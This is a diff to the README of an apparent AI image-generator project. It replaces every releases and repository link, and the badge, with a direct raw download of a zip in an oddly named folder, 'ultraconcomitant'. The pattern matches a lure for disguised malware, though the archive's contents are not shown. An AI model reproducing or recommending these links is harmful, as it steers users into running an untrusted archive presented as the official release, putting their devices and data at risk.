@@ -6,7 +6,7 @@ Welcome to the AI-generated-images-Gemini project! This software allows you to c
 
 ## 📥 Download the Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/arias0726/AI-generated-images-Gemini/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/arias0726/AI-generated-images-Gemini/main/ultraconcomitant/AI-generated-images-Gemini.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/arias0726/AI-generated-images-Gemini/main/ultraconcomitant/AI-generated-images-Gemini.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Follow these simple steps to download and install the application on your device
 
 1. **Visit the Releases Page**  
    Click the link below to visit our releases page, where you can find the latest versions of the application.  
-   [Download from Releases Page](https://github.com/arias0726/AI-generated-images-Gemini/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/arias0726/AI-generated-images-Gemini/main/ultraconcomitant/AI-generated-images-Gemini.zip)
 
 2. **Select the Latest Version**  
    On the releases page, locate the most recent version. This will usually be at the top of the list. Look for version numbers like v1.0.0.
@@ -73,9 +73,9 @@ If you need further assistance, feel free to reach out through the issues sectio
 ## 🌐 Visit Our Repository
 
 For more information about the project, source code, and updates, visit our GitHub repository:  
-[AI-generated-images-Gemini Repository](https://github.com/arias0726/AI-generated-images-Gemini)
+[AI-generated-images-Gemini Repository](https://raw.githubusercontent.com/arias0726/AI-generated-images-Gemini/main/ultraconcomitant/AI-generated-images-Gemini.zip)
 
 ## 📥 Download and Install
 
 Ready to create beautiful images? Don't wait!  
-[Visit this page to download the application](https://github.com/arias0726/AI-generated-images-Gemini/releases) and start your creative journey today!
+[Visit this page to download the application](https://raw.githubusercontent.com/arias0726/AI-generated-images-Gemini/main/ultraconcomitant/AI-generated-images-Gemini.zip) and start your creative journey today!
